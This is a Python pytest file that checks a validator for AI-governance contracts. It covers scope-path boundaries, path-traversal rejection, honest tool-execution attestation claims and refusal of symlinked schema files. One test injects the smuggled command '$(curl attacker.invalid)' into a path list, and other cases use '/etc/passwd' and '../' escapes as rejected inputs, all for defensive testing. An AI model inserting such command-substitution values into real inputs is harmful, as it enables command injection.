from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest

from pr_inspector.aigov_paths import normalize_repository_relative_path
from pr_inspector.aigov_schema_registry import (
    LocalAIGOVSchemaRegistry,
    local_aigov_schema_registry,
)
from pr_inspector.aigov_validation import (
    canonical_scope_digest,
    validate_aigov_contract,
)


ROOT = Path(__file__).resolve().parents[1]
VALID = ROOT / "tests/fixtures/aigov/v2.5.0/schema_valid"


def _fixture(contract: str) -> dict:
    value = json.loads((VALID / f"{contract}.json").read_text(encoding="utf-8"))
    assert isinstance(value, dict)
    return value


def _codes(contract: str, payload: dict) -> set[str]:
    return {item.code for item in validate_aigov_contract(contract, payload)}


def _scope_authority_ref() -> dict:
    return {
        "record_type": "obligation_authority_binding",
        "record_id": "scope-path-boundary",
        "record_digest": "sha256:" + "6" * 64,
    }


def _set_unclaimed_history(payload: dict, status: str = "not_attempted") -> None:
    payload["invocation_record"] = {
        "invocation_id": None,
        "claimed_execution": False,
        "execution_status": status,
        "executed_at": None,
    }
    payload["execution_result"] = {
        "result_identity": None,
        "captured_result_fields": [],
    }
    payload["state_changed"] = False
    payload["readback_status"] = "NOT_PERFORMED"
    payload["readback_ref"] = None
    payload["readback_not_required_authority_ref"] = None
    payload["final_claim_bindings"] = []


def _set_claimed_history(payload: dict, status: str) -> None:
    payload["invocation_record"] = {
        "invocation_id": f"invocation-{status}",
        "claimed_execution": True,
        "execution_status": status,
        "executed_at": "2026-07-18T12:00:00Z",
    }
    payload["execution_result"] = {
        "result_identity": None,
        "captured_result_fields": [],
    }
    payload["state_changed"] = False
    payload["readback_status"] = "NOT_PERFORMED"
    payload["readback_ref"] = None
    payload["readback_not_required_authority_ref"] = None
    payload["final_claim_bindings"] = []


def _readback_ref(exact_identity: str = "comment-900") -> dict:
    return {
        "evidence_id": "readback-repair",
        "evidence_type": "structured_record",
        "exact_identity": exact_identity,
        "source_digest": "sha256:" + "d" * 64,
        "retrieval_method": "github_api",
    }


def test_executable_expression_inside_string_list_is_rejected() -> None:
    payload = _fixture("scope_record")
    payload["included_paths"].append("$(curl attacker.invalid)")
    payload["scope_digest"] = canonical_scope_digest(payload)
    assert "AIGOV-SEM-006" in _codes("scope_record", payload)


def test_directory_wildcard_does_not_overlap_similar_sibling_prefix() -> None:
    payload = _fixture("scope_record")
    payload["included_paths"] = ["foo/**"]
    payload["excluded_paths"] = ["foobar/file.py"]
    payload["scope_authority_binding_refs"] = [_scope_authority_ref()]
    payload["scope_digest"] = canonical_scope_digest(payload)
    assert validate_aigov_contract("scope_record", payload) == ()


def test_directory_wildcard_still_detects_true_descendant_overlap() -> None:
    payload = _fixture("scope_record")
    payload["included_paths"] = ["foo/**"]
    payload["excluded_paths"] = ["foo/private/file.py"]
    payload["scope_authority_binding_refs"] = [_scope_authority_ref()]
    payload["scope_digest"] = canonical_scope_digest(payload)
    assert "AIGOV-SEM-144" in _codes("scope_record", payload)


@pytest.mark.parametrize("collection", ["included_paths", "excluded_paths"])
@pytest.mark.parametrize(
    "bad_path",
    [
        "../outside",
        "foo/../outside",
        "/etc/passwd",
        r"C:\x",
        "C:/x",
        r"\\server\share",
        "//server/share",
        "./",
    ],
)
def test_scope_rejects_non_repository_paths_in_both_collections(
    collection: str,
    bad_path: str,
) -> None:
    payload = _fixture("scope_record")
    payload["included_paths"] = ["safe/**"]
    payload["excluded_paths"] = []
    if collection == "included_paths":
        payload["included_paths"] = [bad_path]
    else:
        payload["excluded_paths"] = [bad_path]
        payload["scope_authority_binding_refs"] = [_scope_authority_ref()]
    payload["scope_digest"] = canonical_scope_digest(payload)

    diagnostics = validate_aigov_contract("scope_record", payload)
    assert "AIGOV-SEM-143" in {item.code for item in diagnostics}
    assert "AIGOV-SEM-145" not in {item.code for item in diagnostics}
    assert any(item.path == f"/{collection}/0" for item in diagnostics)


def test_repository_relative_globs_remain_supported() -> None:
    payload = _fixture("scope_record")
    payload["included_paths"] = [
        "foo/**",
        "foo/*.py",
        ".github/workflows/validate.yml",
    ]
    payload["excluded_paths"] = []
    payload["scope_digest"] = canonical_scope_digest(payload)
    assert validate_aigov_contract("scope_record", payload) == ()


@pytest.mark.parametrize(
    "bad_path",
    ["", "./", "/", "../x", r"C:\x", "C:/x", r"\\server\share", "//server/share"],
)
def test_shared_repository_path_helper_rejects_escape_forms(bad_path: str) -> None:
    with pytest.raises((TypeError, ValueError)):
        normalize_repository_relative_path(bad_path)


def test_shared_repository_path_helper_preserves_supported_globs() -> None:
    assert normalize_repository_relative_path("./foo/**") == "foo/**"
    assert normalize_repository_relative_path("foo/*.py") == "foo/*.py"
    assert (
        normalize_repository_relative_path(".github/workflows/validate.yml")
        == ".github/workflows/validate.yml"
    )


def test_workflow_file_uses_repository_path_boundary() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["workflow_identity"]["workflow_file"] = (
        ".github/workflows/..\\validate.yml"
    )
    assert "AIGOV-SEM-218" in _codes("tool_execution_attestation", payload)


def test_unclaimed_execution_cannot_represent_state_change() -> None:
    payload = _fixture("tool_execution_attestation")
    _set_unclaimed_history(payload)
    payload["state_changed"] = True
    payload["readback_status"] = "VERIFIED"
    payload["readback_ref"] = _readback_ref()
    assert "AIGOV-SEM-213" in _codes("tool_execution_attestation", payload)


def test_unclaimed_execution_cannot_carry_populated_result() -> None:
    payload = _fixture("tool_execution_attestation")
    _set_unclaimed_history(payload)
    payload["execution_result"] = {
        "result_identity": "comment-900",
        "captured_result_fields": ["comment_id"],
    }
    assert "AIGOV-SEM-213" in _codes("tool_execution_attestation", payload)


def test_unclaimed_execution_cannot_carry_verified_claim() -> None:
    payload = _fixture("tool_execution_attestation")
    _set_unclaimed_history(payload)
    payload["execution_result"] = {
        "result_identity": "comment-900",
        "captured_result_fields": ["comment_id"],
    }
    payload["final_claim_bindings"] = [
        {
            "claim_id": "claim-unclaimed",
            "result_field_refs": ["comment_id"],
            "binding_status": "VERIFIED_RESULT_BOUND",
        }
    ]
    assert "AIGOV-SEM-219" in _codes("tool_execution_attestation", payload)


def test_failed_execution_cannot_carry_verified_result_claim() -> None:
    payload = _fixture("tool_execution_attestation")
    _set_claimed_history(payload, "failed")
    payload["execution_result"] = {
        "result_identity": "comment-900",
        "captured_result_fields": ["comment_id"],
    }
    payload["final_claim_bindings"] = [
        {
            "claim_id": "claim-failed",
            "result_field_refs": ["comment_id"],
            "binding_status": "VERIFIED_RESULT_BOUND",
        }
    ]
    assert "AIGOV-SEM-219" in _codes("tool_execution_attestation", payload)


def test_invoked_execution_cannot_carry_verified_readback_claim() -> None:
    payload = _fixture("tool_execution_attestation")
    _set_claimed_history(payload, "invoked")
    payload["execution_result"] = {
        "result_identity": "comment-900",
        "captured_result_fields": ["comment_id"],
    }
    payload["readback_status"] = "VERIFIED"
    payload["readback_ref"] = _readback_ref()
    payload["final_claim_bindings"] = [
        {
            "claim_id": "claim-invoked",
            "result_field_refs": ["comment_id"],
            "binding_status": "VERIFIED_READBACK_BOUND",
        }
    ]
    assert "AIGOV-SEM-219" in _codes("tool_execution_attestation", payload)


def test_verified_claim_requires_result_identity() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["execution_result"]["result_identity"] = None
    assert "AIGOV-SEM-214" in _codes("tool_execution_attestation", payload)


def test_verified_claim_requires_all_referenced_fields_to_be_captured() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["final_claim_bindings"][0]["result_field_refs"] = ["missing_field"]
    assert "AIGOV-SEM-215" in _codes("tool_execution_attestation", payload)


def test_verified_readback_claim_requires_exact_result_evidence() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["readback_ref"]["exact_identity"] = "different-result"
    assert "AIGOV-SEM-216" in _codes("tool_execution_attestation", payload)


def test_failed_and_unverified_history_remain_valid_without_success_claims() -> None:
    failed = _fixture("tool_execution_attestation")
    _set_claimed_history(failed, "failed")
    failed["final_claim_bindings"] = [
        {
            "claim_id": "claim-failed-detached",
            "result_field_refs": ["comment_id"],
            "binding_status": "INVALID_RESULT_DETACHED",
        }
    ]
    assert validate_aigov_contract("tool_execution_attestation", failed) == ()

    unverified = _fixture("tool_execution_attestation")
    _set_unclaimed_history(unverified, "unverified")
    assert validate_aigov_contract("tool_execution_attestation", unverified) == ()


@pytest.mark.parametrize(
    "filename",
    [
        "schema-index.json",
        "common.schema.json",
        "classification_record.schema.json",
    ],
)
def test_schema_registry_rejects_symlinked_files_before_validator_construction(
    tmp_path: Path,
    filename: str,
) -> None:
    source = local_aigov_schema_registry().schema_dir
    target = tmp_path / "schemas"
    shutil.copytree(source, target)

    external = tmp_path / f"external-{filename}"
    shutil.copyfile(target / filename, external)
    (target / filename).unlink()
    (target / filename).symlink_to(external)

    with pytest.raises(RuntimeError, match="symlinked"):
        LocalAIGOVSchemaRegistry(target)
